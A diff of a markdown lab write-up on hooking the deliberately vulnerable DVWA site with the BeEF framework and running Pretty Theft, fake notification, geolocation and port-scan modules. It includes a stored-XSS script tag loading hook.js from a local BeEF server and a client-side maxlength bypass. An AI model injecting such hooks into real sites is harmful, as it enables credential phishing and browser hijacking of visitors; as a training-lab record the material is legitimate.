@@ -1,10 +1,8 @@
-## Social Engineering >> Pretty Theft
+## "Hooking the DVWA Website via BeEF"
 
-1. Successfully "hooked" URL 192.168.13.25 on port 80 / Firefox
+1. ### Successfully "hooked" URL 192.168.13.25 on port 80 / Firefox
 
     ![pic](hook-1.PNG)  
-
-* Picture from the DVWA website: URL 192.168.13.25/vulnerabilities/xxs_s/
 
 **NOTE: the payload required to "hook" the DVWA website requires injecting a script. However the script (script src="http://127.0.0.1:3000/hook.js"></script) has to many words to be fully pasted into the message. In-order to fix this limitation, you must change setting in the Inspect Element. Specifically the textarea name / maxlength from 50 to 75.**
 
@@ -12,7 +10,7 @@
 
 ### [Picture of script length correct](hook-500.PNG)
 
-2. Launching the Pretty Theft Attack7
+2. ### Launching the Pretty Theft Attack
 
     ![pic](hook-3.PNG) 
 
@@ -33,17 +31,17 @@
 
     ![pic](hook-6.PNG) 
 
-3. From the pictures above you can see that the attack was SUCCESSFULL
+3. ### From the pictures above you can see that the attack was SUCCESSFULL
 
-## Example of a SUCCESSFULL Fake Notification Attack
+**Example of a SUCCESSFULL Fake Notification Attack**
 
 ![pic](hook-7.PNG) 
 
-## Example of a SUCCESSFULL Get Geolocation (Third Party) Attack
+ **Example of a SUCCESSFULL Get Geolocation (Third Party) Attack**
 
 ![pic](hook-8.PNG)
 
-## Example of a SUCCESSFULL Port Scanner Attack
+ **Example of a SUCCESSFULL Port Scanner Attack**
 
 ![pic](hook-9.PNG)
 
